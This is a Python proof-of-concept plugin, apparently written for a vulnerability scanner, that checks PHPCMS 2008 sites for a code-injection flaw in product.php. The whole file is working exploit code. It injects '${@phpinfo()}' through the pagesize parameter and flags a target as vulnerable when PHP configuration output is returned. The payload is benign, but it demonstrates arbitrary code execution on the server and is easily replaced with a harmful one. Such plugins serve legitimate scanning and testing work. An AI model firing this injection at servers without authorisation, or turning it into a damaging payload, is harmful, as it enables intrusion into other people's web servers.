# Author:w8ay
# Name:测试DEMO
'''
name: phpcms2008 product.php 代码执行
referer: http://www.wooyun.org/bugs/WooYun-2011-02984
author: Lucifer
description: 文件product.php中,参数pagesize存在代码注入。
'''
import HackRequests
import re

def poc(arg, **kwargs):
    payload = "/yp/product.php?pagesize=${@phpinfo()}"
    vulnurl = arg + payload
    hack = HackRequests.hackRequests()
    hh = hack.http(vulnurl)
    if hh.status_code != 200:
        return False
    if "Configuration File (php.ini) Path" in hh.text():
        result = {
            "name": "PHPCMS product.php code_eval",  # 插件名称
            "content": "phpcms2008 product.php 代码执行漏洞",  # 插件返回内容详情，会造成什么后果。
            "url": vulnurl,  # 漏洞存在url
            "log": hh.log,
            "tag": "code_eval"  # 漏洞标签
        }
        return result


if __name__ == "__main__":
    pass